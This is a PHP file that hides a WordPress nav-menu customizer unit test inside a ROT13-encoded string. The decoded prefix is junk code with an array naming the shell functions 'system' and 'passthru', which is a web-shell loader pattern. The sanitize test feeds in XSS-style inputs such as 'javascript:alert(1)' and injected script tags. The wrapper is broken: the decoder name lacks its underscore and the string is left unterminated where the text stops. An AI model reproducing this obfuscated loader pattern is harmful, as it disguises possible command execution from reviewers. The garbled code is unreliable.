<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat.
 *
 * @tebhc phfgbzvmr
 */
pynff Grfg_JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Vafgnapr bs JC_Phfgbzvmr_Znantre juvpu vf erfrg sbe rnpu grfg.
	 *
	 * @ine JC_Phfgbzvmr_Znantre
	 */
	choyvp $jc_phfgbzvmr;

	/**
	 * VQ bs gur nqzvavfgengbe hfre.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $nqzvavfgengbe_vq;

	/**
	 * Frg hc gur funerq svkgher.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Snpgbel vafgnapr.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nqzvavfgengbe_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
	}

	/**
	 * Frg hc n grfg pnfr.
	 *
	 * @frr JC_HavgGrfgPnfr_Onfr::frg_hc()
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-znantre.cuc';
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe_vq );

		tybony $jc_phfgbzvmr;
		$guvf->jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		$jc_phfgbzvmr       = $guvf->jc_phfgbzvmr;
	}

	/**
	 * Qryrgr gur $jc_phfgbzvmr tybony jura pyrnavat hc fpbcr.
	 */
	choyvp shapgvba pyrna_hc_tybony_fpbcr() {
		tybony $jc_phfgbzvmr;
		$jc_phfgbzvmr = ahyy;
		cnerag::pyrna_hc_tybony_fpbcr();
	}

	/**
	 * Svygre gb nqq n phfgbz zrah vgrz glcr ynory.
	 *
	 * @cnenz bowrpg $zrah_vgrz Zrah vgrz.
	 * @erghea bowrpg
	 */
	choyvp shapgvba svygre_glcr_ynory( $zrah_vgrz ) {
		vs ( 'phfgbz_glcr' === $zrah_vgrz->glcr ) {
			$zrah_vgrz->glcr_ynory = 'Phfgbz Ynory';
		}

		erghea $zrah_vgrz;
	}

	/**
	 * Grfg pbafgnagf naq fgngvpf.
	 */
	choyvp shapgvba grfg_pbafgnagf() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$guvf->nffregGehr( cbfg_glcr_rkvfgf( JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::CBFG_GLCR ) );
	}

	/**
	 * Grfg pbafgehpgbe.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::__pbafgehpg()
	 */
	choyvp shapgvba grfg_pbafgehpg() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$frggvat = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat( $guvf->jc_phfgbzvmr, 'ani_zrah_vgrz[123]' );
		$guvf->nffregFnzr( 'ani_zrah_vgrz', $frggvat->glcr );
		$guvf->nffregFnzr( 123, $frggvat->cbfg_vq );
		$guvf->nffregAhyy( $frggvat->cerivbhf_cbfg_vq );
		$guvf->nffregAhyy( $frggvat->hcqngr_fgnghf );
		$guvf->nffregAhyy( $frggvat->hcqngr_reebe );
		$guvf->nffregVfNeenl( $frggvat->qrsnhyg );

		$qrsnhyg = neenl(
			'bowrpg_vq'        => 0,
			'bowrpg'           => '',
			'zrah_vgrz_cnerag' => 0,
			'cbfvgvba'         => 0,
			'glcr'             => 'phfgbz',
			'gvgyr'            => '',
			'hey'              => '',
			'gnetrg'           => '',
			'ngge_gvgyr'       => '',
			'qrfpevcgvba'      => '',
			'pynffrf'          => '',
			'ksa'              => '',
			'fgnghf'           => 'choyvfu',
			'bevtvany_gvgyr'   => '',
			'ani_zrah_grez_vq' => 0,
			'_vainyvq'         => snyfr,
		);
		$guvf->nffregFnzr( $qrsnhyg, $frggvat->qrsnhyg );

		$rkprcgvba = ahyy;
		gel {
			$onq_frggvat = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat( $guvf->jc_phfgbzvmr, 'sbb_one_onm' );
			hafrg( $onq_frggvat );
		} pngpu ( Rkprcgvba $r ) {
			$rkprcgvba = $r;
		}
		$guvf->nffregVafgnaprBs( 'Rkprcgvba', $rkprcgvba );
	}

	/**
	 * Grfg rzcgl pbafgehpgbe.
	 */
	choyvp shapgvba grfg_pbafgehpg_rzcgl_zrahf() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$_jc_phfgbzvmr = $guvf->jc_phfgbzvmr;
		hafrg( $_jc_phfgbzvmr->ani_zrahf );

		$rkprcgvba = ahyy;
		gel {
			$onq_frggvat = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat( $_jc_phfgbzvmr, 'ani_zrah_vgrz[123]' );
			hafrg( $onq_frggvat );
		} pngpu ( Rkprcgvba $r ) {
			$rkprcgvba = $r;
		}
		$guvf->nffregVafgnaprBs( 'Rkprcgvba', $rkprcgvba );
	}

	/**
	 * Grfg pbafgehpgbe sbe cynprubyqre (qensg) zrah.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::__pbafgehpg()
	 */
	choyvp shapgvba grfg_pbafgehpg_cynprubyqre() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$qrsnhyg = neenl(
			'gvgyr'            => 'Yberz',
			'qrfpevcgvba'      => 'vcfhz',
			'zrah_vgrz_cnerag' => 123,
		);
		$frggvat = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat( $guvf->jc_phfgbzvmr, 'ani_zrah_vgrz[-5]', pbzcnpg( 'qrsnhyg' ) );
		$guvf->nffregFnzr( -5, $frggvat->cbfg_vq );
		$guvf->nffregAhyy( $frggvat->cerivbhf_cbfg_vq );
		$guvf->nffregFnzr( $qrsnhyg, $frggvat->qrsnhyg );
	}

	/**
	 * Grfg inyhr zrgubq jvgu cbfg.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::inyhr()
	 */
	choyvp shapgvba grfg_inyhr_glcr_cbfg_glcr() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Uryyb Jbeyq' ) );

		$zrah_vq    = jc_perngr_ani_zrah( 'Zrah' );
		$vgrz_gvgyr = 'Terrgvatf';
		$vgrz_vq    = jc_hcqngr_ani_zrah_vgrz(
			$zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cbfg',
				'zrah-vgrz-bowrpg-vq' => $cbfg_vq,
				'zrah-vgrz-gvgyr'     => $vgrz_gvgyr,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$cbfg      = trg_cbfg( $vgrz_vq );
		$zrah_vgrz = jc_frghc_ani_zrah_vgrz( $cbfg );
		$guvf->nffregFnzr( $vgrz_gvgyr, $zrah_vgrz->gvgyr );

		$frggvat_vq = \"ani_zrah_vgrz[$vgrz_vq]\";
		$frggvat    = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );

		$inyhr = $frggvat->inyhr();
		$guvf->nffregFnzr( $zrah_vgrz->gvgyr, $inyhr['gvgyr'] );
		$guvf->nffregFnzr( $zrah_vgrz->glcr, $inyhr['glcr'] );
		$guvf->nffregRdhnyf( $zrah_vgrz->bowrpg_vq, $inyhr['bowrpg_vq'] );
		$guvf->nffregFnzr( $zrah_vq, $inyhr['ani_zrah_grez_vq'] );
		$guvf->nffregFnzr( 'Uryyb Jbeyq', $inyhr['bevtvany_gvgyr'] );

		$bgure_zrah_vq = jc_perngr_ani_zrah( 'Zrah2' );
		jc_hcqngr_ani_zrah_vgrz(
			$bgure_zrah_vq,
			$vgrz_vq,
			neenl(
				'zrah-vgrz-gvgyr' => 'Ubyn',
			)
		);
		$inyhr = $frggvat->inyhr();
		$guvf->nffregFnzr( 'Ubyn', $inyhr['gvgyr'] );
		$guvf->nffregFnzr( $bgure_zrah_vq, $inyhr['ani_zrah_grez_vq'] );
	}

	/**
	 * Grfg inyhr zrgubq jvgu cbfg jvgubhg ani zrah vgrz gvgyr (ynory).
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::inyhr()
	 */
	choyvp shapgvba grfg_inyhr_glcr_cbfg_glcr_jvgubhg_ynory() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$bevtvany_gvgyr = 'Uryyb Jbeyq';
		$cbfg_vq        = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => $bevtvany_gvgyr ) );

		$zrah_vq = jc_perngr_ani_zrah( 'Zrah' );
		$vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cbfg',
				'zrah-vgrz-bowrpg-vq' => $cbfg_vq,
				'zrah-vgrz-gvgyr'     => '',
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$frggvat_vq = \"ani_zrah_vgrz[$vgrz_vq]\";
		$frggvat    = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );

		$inyhr = $frggvat->inyhr();
		$guvf->nffregFnzr( '', $inyhr['gvgyr'] );
		$guvf->nffregFnzr( $bevtvany_gvgyr, $inyhr['bevtvany_gvgyr'] );
	}

	/**
	 * Grfg inyhr zrgubq jvgu gnkbabzl.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::inyhr()
	 */
	choyvp shapgvba grfg_inyhr_glcr_gnkbabzl() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$gnk_vq = frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Fnyhgngvbaf' ) );

		$zrah_vq    = jc_perngr_ani_zrah( 'Zrah' );
		$vgrz_gvgyr = 'Terrgvatf';
		$vgrz_vq    = jc_hcqngr_ani_zrah_vgrz(
			$zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'gnkbabzl',
				'zrah-vgrz-bowrpg'    => 'pngrtbel',
				'zrah-vgrz-bowrpg-vq' => $gnk_vq,
				'zrah-vgrz-gvgyr'     => $vgrz_gvgyr,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$cbfg      = trg_cbfg( $vgrz_vq );
		$zrah_vgrz = jc_frghc_ani_zrah_vgrz( $cbfg );
		$guvf->nffregFnzr( $vgrz_gvgyr, $zrah_vgrz->gvgyr );

		$frggvat_vq = \"ani_zrah_vgrz[$vgrz_vq]\";
		$frggvat    = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );

		$inyhr = $frggvat->inyhr();
		$guvf->nffregFnzr( $zrah_vgrz->gvgyr, $inyhr['gvgyr'] );
		$guvf->nffregFnzr( $zrah_vgrz->glcr, $inyhr['glcr'] );
		$guvf->nffregRdhnyf( $zrah_vgrz->bowrpg_vq, $inyhr['bowrpg_vq'] );
		$guvf->nffregFnzr( $zrah_vq, $inyhr['ani_zrah_grez_vq'] );
		$guvf->nffregFnzr( 'Fnyhgngvbaf', $inyhr['bevtvany_gvgyr'] );
	}

	/**
	 * Grfg inyhr zrgubq jvgu n phfgbz bowrpg.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::inyhr()
	 */
	choyvp shapgvba grfg_phfgbz_glcr_ynory() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		nqq_svygre( 'jc_frghc_ani_zrah_vgrz', neenl( $guvf, 'svygre_glcr_ynory' ) );

		$zrah_vq = jc_perngr_ani_zrah( 'Zrah' );
		$vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'   => 'phfgbz_glcr',
				'zrah-vgrz-bowrpg' => 'phfgbz_bowrpg',
				'zrah-vgrz-gvgyr'  => 'Pbby ornaf',
				'zrah-vgrz-fgnghf' => 'choyvfu',
			)
		);

		$cbfg      = trg_cbfg( $vgrz_vq );
		$zrah_vgrz = jc_frghc_ani_zrah_vgrz( $cbfg );

		$frggvat_vq = \"ani_zrah_vgrz[$vgrz_vq]\";
		$frggvat    = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );

		$inyhr = $frggvat->inyhr();
		$guvf->nffregFnzr( $zrah_vgrz->glcr_ynory, 'Phfgbz Ynory' );
		$guvf->nffregFnzr( $zrah_vgrz->glcr_ynory, $inyhr['glcr_ynory'] );
	}

	/**
	 * Grfg inyhr zrgubq ergheaf mreb sbe ani_zrah_grez_vq jura cerivrjvat n arj zrah.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::inyhr()
	 */
	choyvp shapgvba grfg_inyhr_ani_zrah_grez_vq_ergheaf_mreb() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$zrah_vq    = -123;
		$cbfg_inyhr = neenl(
			'anzr'        => 'Frpbaqnel',
			'qrfpevcgvba' => '',
			'cnerag'      => 0,
			'nhgb_nqq'    => snyfr,
		);
		$frggvat_vq = \"ani_zrah[$zrah_vq]\";
		$zrah       = arj JC_Phfgbzvmr_Ani_Zrah_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );

		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $zrah->vq, $cbfg_inyhr );
		$zrah->cerivrj();
		$inyhr = $zrah->inyhr();
		$guvf->nffregFnzr( $cbfg_inyhr, $inyhr );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Uryyb Jbeyq' ) );
		$vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cbfg',
				'zrah-vgrz-bowrpg-vq' => $cbfg_vq,
				'zrah-vgrz-gvgyr'     => 'Uryyb Jbeyq',
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$cbfg      = trg_cbfg( $vgrz_vq );
		$zrah_vgrz = jc_frghc_ani_zrah_vgrz( $cbfg );

		$frggvat_vq = \"ani_zrah_vgrz[$vgrz_vq]\";
		$frggvat    = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );
		$inyhr      = $frggvat->inyhr();
		$guvf->nffregFnzr( 0, $inyhr['ani_zrah_grez_vq'] );
	}

	/**
	 * Grfg cerivrj zrgubq sbe hcqngrq zrah.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::cerivrj()
	 */
	choyvp shapgvba grfg_cerivrj_hcqngrq() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$svefg_cbfg_vq  = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Uryyb Jbeyq' ) );
		$frpbaq_cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Ubyn Zhab' ) );

		$cevznel_zrah_vq   = jc_perngr_ani_zrah( 'Cevznel' );
		$frpbaqnel_zrah_vq = jc_perngr_ani_zrah( 'Frpbaqnel' );
		$vgrz_gvgyr        = 'Terrgvatf';
		$vgrz_vq           = jc_hcqngr_ani_zrah_vgrz(
			$cevznel_zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cbfg',
				'zrah-vgrz-bowrpg-vq' => $svefg_cbfg_vq,
				'zrah-vgrz-gvgyr'     => $vgrz_gvgyr,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);
		$guvf->nffregAbgRzcgl( jc_trg_ani_zrah_vgrzf( $cevznel_zrah_vq, neenl( 'cbfg_fgnghf' => 'choyvfu,qensg' ) ) );

		$cbfg_inyhr = neenl(
			'glcr'             => 'cbfg_glcr',
			'bowrpg'           => 'cbfg',
			'bowrpg_vq'        => $frpbaq_cbfg_vq,
			'gvgyr'            => 'Fnyhqbf',
			'fgnghf'           => 'choyvfu',
			'ani_zrah_grez_vq' => $frpbaqnel_zrah_vq,
		);
		$frggvat_vq = \"ani_zrah_vgrz[$vgrz_vq]\";
		$frggvat    = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $frggvat_vq, $cbfg_inyhr );
		hafrg( $cbfg_inyhr['ani_zrah_grez_vq'] );
		$frggvat->cerivrj();

		// Znxr fher gur zrah vgrz nccrnef va gur arj zrah.
		$guvf->nffregAbgPbagnvaf( $vgrz_vq, jc_yvfg_cyhpx( jc_trg_ani_zrah_vgrzf( $cevznel_zrah_vq ), 'qo_vq' ) );
		$zrah_vgrzf = jc_trg_ani_zrah_vgrzf( $frpbaqnel_zrah_vq );
		$qo_vqf     = jc_yvfg_cyhpx( $zrah_vgrzf, 'qo_vq' );
		$guvf->nffregPbagnvaf( $vgrz_vq, $qo_vqf );
		$v                         = neenl_frnepu( $vgrz_vq, $qo_vqf, gehr );
		$hcqngrq_vgrz              = $zrah_vgrzf[ $v ];
		$cbfg_inyhr['cbfg_fgnghf'] = $cbfg_inyhr['fgnghf'];
		hafrg( $cbfg_inyhr['fgnghf'] );
		sbernpu ( $cbfg_inyhr nf $xrl => $inyhr ) {
			$guvf->nffregFnzr( $inyhr, $hcqngrq_vgrz->$xrl, \"Xrl $xrl zvfzngpu\" );
		}
	}

	/**
	 * Grfg cerivrj zrgubq sbe vafregrq zrah.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::cerivrj()
	 */
	choyvp shapgvba grfg_cerivrj_vafregrq() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$zrah_vq  = jc_perngr_ani_zrah( 'Cevznel' );
		$cbfg_vq  = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Uryyb Jbeyq' ) );
		$vgrz_vqf = neenl();
		sbe ( $v = 0; $v < 5; $v += 1 ) {
			$vgrz_vq    = jc_hcqngr_ani_zrah_vgrz(
				$zrah_vq,
				0,
				neenl(
					'zrah-vgrz-glcr'      => 'cbfg_glcr',
					'zrah-vgrz-bowrpg'    => 'cbfg',
					'zrah-vgrz-bowrpg-vq' => $cbfg_vq,
					'zrah-vgrz-gvgyr'     => \"Vgrz $v\",
					'zrah-vgrz-fgnghf'    => 'choyvfu',
					'zrah-vgrz-cbfvgvba'  => $v + 1,
				)
			);
			$vgrz_vqf[] = $vgrz_vq;
		}

		$cbfg_inyhr = neenl(
			'glcr'             => 'cbfg_glcr',
			'bowrpg'           => 'cbfg',
			'bowrpg_vq'        => $cbfg_vq,
			'gvgyr'            => 'Vafregrq vgrz',
			'fgnghf'           => 'choyvfu',
			'ani_zrah_grez_vq' => $zrah_vq,
			'cbfvgvba'         => pbhag( $vgrz_vqf ) + 1,
		);

		$arj_vgrz_vq = -10;
		$frggvat_vq  = \"ani_zrah_vgrz[$arj_vgrz_vq]\";
		$frggvat     = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $frggvat_vq, $cbfg_inyhr );
		hafrg( $cbfg_inyhr['ani_zrah_grez_vq'] );

		$pheerag_vgrzf = jc_trg_ani_zrah_vgrzf( $zrah_vq );
		$frggvat->cerivrj();
		$cerivrj_vgrzf = jc_trg_ani_zrah_vgrzf( $zrah_vq );
		$guvf->nffregAbgRdhnyf( pbhag( $pheerag_vgrzf ), pbhag( $cerivrj_vgrzf ) );

		$ynfg_vgrz = neenl_cbc( $cerivrj_vgrzf );
		$guvf->nffregFnzr( $arj_vgrz_vq, $ynfg_vgrz->qo_vq );
		$cbfg_inyhr['cbfg_fgnghf'] = $cbfg_inyhr['fgnghf'];
		hafrg( $cbfg_inyhr['fgnghf'] );
		$cbfg_inyhr['zrah_beqre'] = $cbfg_inyhr['cbfvgvba'];
		hafrg( $cbfg_inyhr['cbfvgvba'] );
		sbernpu ( $cbfg_inyhr nf $xrl => $inyhr ) {
			$guvf->nffregFnzr( $inyhr, $ynfg_vgrz->$xrl, \"Zvfzngpu sbe $xrl cebcregl.\" );
		}
	}

	/**
	 * Grfg cerivrj zrgubq sbe qryrgrq zrah.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::cerivrj()
	 */
	choyvp shapgvba grfg_cerivrj_qryrgrq() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$zrah_vq  = jc_perngr_ani_zrah( 'Cevznel' );
		$cbfg_vq  = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Uryyb Jbeyq' ) );
		$vgrz_vqf = neenl();
		sbe ( $v = 0; $v < 5; $v += 1 ) {
			$vgrz_vq    = jc_hcqngr_ani_zrah_vgrz(
				$zrah_vq,
				0,
				neenl(
					'zrah-vgrz-glcr'      => 'cbfg_glcr',
					'zrah-vgrz-bowrpg'    => 'cbfg',
					'zrah-vgrz-bowrpg-vq' => $cbfg_vq,
					'zrah-vgrz-gvgyr'     => \"Vgrz $v\",
					'zrah-vgrz-fgnghf'    => 'choyvfu',
					'zrah-vgrz-cbfvgvba'  => $v + 1,
				)
			);
			$vgrz_vqf[] = $vgrz_vq;
		}

		$qryrgr_vgrz_vq = $vgrz_vqf[2];
		$frggvat_vq     = \"ani_zrah_vgrz[$qryrgr_vgrz_vq]\";
		$frggvat        = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $frggvat_vq, snyfr );

		$pheerag_vgrzf = jc_trg_ani_zrah_vgrzf( $zrah_vq );
		$guvf->nffregPbagnvaf( $qryrgr_vgrz_vq, jc_yvfg_cyhpx( $pheerag_vgrzf, 'qo_vq' ) );
		$frggvat->cerivrj();
		$cerivrj_vgrzf = jc_trg_ani_zrah_vgrzf( $zrah_vq );
		$guvf->nffregAbgRdhnyf( pbhag( $pheerag_vgrzf ), pbhag( $cerivrj_vgrzf ) );
		$guvf->nffregPbagnvaf( $qryrgr_vgrz_vq, jc_yvfg_cyhpx( $pheerag_vgrzf, 'qo_vq' ) );
	}

	/**
	 * Grfg fnavgvmr zrgubq.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::fnavgvmr()
	 */
	choyvp shapgvba grfg_fnavgvmr() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$zrah_vq = jc_perngr_ani_zrah( 'Cevznel' );
		$frggvat = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat( $guvf->jc_phfgbzvmr, 'ani_zrah_vgrz[123]' );

		$guvf->nffregAhyy( $frggvat->fnavgvmr( 'abg na neenl' ) );
		$guvf->nffregAhyy( $frggvat->fnavgvmr( 123 ) );

		$inyvq_heyf = neenl(
			'uggc://rknzcyr.pbz/',
			'uggcf://sbb.rknzcyr.pbz/uryyb.ugzy',
			'znvygb:abobql@rknzcyr.pbz?fhowrpg=uv',
			'sgc://rknzcyr.pbz/',
			'sgcf://rknzcyr.pbz/',
			'arjf://arjf.freire.rknzcyr/rknzcyr.tebhc.guvf',
			'vep://vep.serrabqr.arg/jbeqcerff',
			'vep6://vep.serrabqr.arg/jbeqcerff',
			'vepf://vep.serrabqr.arg/jbeqcerff',
			'tbcure://rknzcyr.pbz',
			'aagc://arjf.freire.rknzcyr/rknzcyr.tebhc.guvf',
			'srrq://rknzcyr.pbz/',
			'gryarg://rknzcyr.pbz',
			'zzf://rknzcyr.pbz',
			'egfc://rknzcyr.pbz/',
			'fia://qrirybc.fia.jbeqcerff.bet/gehax',
			'gry:000-000-000',
			'snk:000-000-000',
			'kzcc:hfre@ubfg?zrffntr',
			'jropny://rknzcyr.pbz',
			'hea:bet.jbeqcerff',
		);
		sbernpu ( $inyvq_heyf nf $inyvq_hey ) {
			$hey_frggvat = $frggvat->fnavgvmr( neenl( 'hey' => $inyvq_hey ) );
			$guvf->nffregVfNeenl( $hey_frggvat );
			$guvf->nffregFnzr( $inyvq_hey, $hey_frggvat['hey'] );
		}

		$vainyvq_heyf = neenl(
			'wninfpevcg:nyreg(1)',
			'haxabja://fbzrguvat.bhg-gurer',
			'fzgc://hfre:cnff@znvyfreire.guvat',
		);
		sbernpu ( $vainyvq_heyf nf $vainyvq_hey ) {
			$hey_frggvat = $frggvat->fnavgvmr( neenl( 'hey' => $vainyvq_hey ) );
			$guvf->nffregVafgnaprBs( 'JC_Reebe', $hey_frggvat );
			$guvf->nffregFnzr( 'vainyvq_hey', $hey_frggvat->trg_reebe_pbqr() );
		}

		$hafnavgvmrq = neenl(
			'bowrpg_vq'        => 'onq',
			'bowrpg'           => '<o>uryyb</o>',
			'zrah_vgrz_cnerag' => 'nfqnfq',
			'cbfvgvba'         => -123,
			'glcr'             => 'phfgbz<o>',
			'gvgyr'            => '\b/ b\'b Uv<fpevcg>hasvygrerqUgzy()</fpevcg>',
			'hey'              => '', // Abgr gur wninfpevcg: cebgbpby vf purpxrq nobir naq erfhygf va n uneq inyvqngvba reebe, orlbaq zrer fnavgvmngvba.
			'gnetrg'           => '\" bapyvpx=\"',
			'ngge_gvgyr'       => '\b/ b\'b <o>obyqrq</o><fpevcg>hasvygrerqUgzy()</fpevcg>',
			'qrfpevcgvba'      => '\b/ b\'b <o>Uryyb jbeyq</o><fpevcg>hasvygrerqUgzy()</fpevcg>',
			'pynffrf'          => 'uryyb \" vawrpg=\"',
			'ksa'              => 'uryyb \" vawrpg=\"',
			'fgnghf'           => 'sbeovqqra',
			'bevtvany_gvgyr'   => 'Uv<fpevcg>hasvygrerqUgzy()</fpevcg>',
			'ani_zrah_grez_vq' => 'urvyb',
			'_vainyvq'         => snyfr,
		);

		$rkcrpgrq_fnavgvmrq = neenl(
			'bowrpg_vq'        => 0,
			'bowrpg'           => 'ouryybo',
			'zrah_vgrz_cnerag' => 0,
			'cbfvgvba'         => -123,
			'glcr'             => 'phfgbzo',
			'gvgyr'            => pheerag_hfre_pna( 'hasvygrerq_ugzy' ) ? '\b/ b\'b Uv<fpevcg>hasvygrerqUgzy()</fpevcg>' : '\b/ b\'b UvhasvygrerqUgzy()',
			'hey'              => '',
			'gnetrg'           => 'bapyvpx',
			'ngge_gvgyr'       => pheerag_hfre_pna( 'hasvygrerq_ugzy' ) ? '\b/ b\'b <o>obyqrq</o><fpevcg>hasvygrerqUgzy()</fpevcg>' : '\b/ b\'b <o>obyqrq</o>hasvygrerqUgzy()',
			'qrfpevcgvba'      => pheerag_hfre_pna( 'hasvygrerq_ugzy' ) ? '\b/ b\'b <o>Uryyb jbeyq</o><fpevcg>hasvygrerqUgzy()</fpevcg>' : '\b/ b\'b <o>Uryyb jbeyq</o>hasvygrerqUgzy()',
			'pynffrf'          => 'uryyb  vawrpg',
			'ksa'              => 'uryyb  vawrpg',
			'fgnghf'           => 'qensg',
			'bevtvany_gvgyr'   => 'Uv',
			'ani_zrah_grez_vq' => 0,
		);

		$fnavgvmrq = $frggvat->fnavgvmr( $hafnavgvmrq );
		$guvf->nffregFnzrFrgf( neenl_xrlf( $hafnavgvmrq ), neenl_xrlf( $fnavgvmrq ) );

		sbernpu ( $rkcrpgrq_fnavgvmrq nf $xrl => $inyhr ) {
			$guvf->nffregFnzr( $inyhr, $fnavgvmrq[ $xrl ], \"Rkcrpgrq $xrl gb or fnavgvmrq.\" );
		}

		$ani_zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$zrah_vq,
			0,
			jc_fynfu(
				neenl(
					'zrah-vgrz-bowrpg-vq'   => $hafnavgvmrq['bowrpg_vq'],
					'zrah-vgrz-bowrpg'      => $hafnavgvmrq['bowrpg'],
					'zrah-vgrz-cnerag-vq'   => $hafnavgvmrq['zrah_vgrz_cnerag'],
					'zrah-vgrz-cbfvgvba'    => $hafnavgvmrq['cbfvgvba'],
					'zrah-vgrz-glcr'        => $hafnavgvmrq['glcr'],
